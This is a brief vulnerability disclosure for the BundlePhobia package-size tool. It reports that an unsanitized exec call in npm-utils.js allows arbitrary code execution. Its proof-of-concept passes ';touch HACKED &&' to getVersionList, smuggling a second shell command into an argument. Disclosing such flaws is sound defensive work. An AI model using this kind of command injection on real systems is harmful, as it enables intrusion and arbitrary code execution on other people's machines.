# Description
```BundlePhobia``` is a tool to help you find the cost of adding a npm package to your bundle. It enables you to query package sizes.
The ```npm-utils.js``` has a unsanitized ```exec``` function which leads to ```Arbitrary code execution```

# Proof-of-concept
```
const util = require('./npm-utils.js');
let a = util.getVersionList(';touch HACKED &&');
console.log(a);
```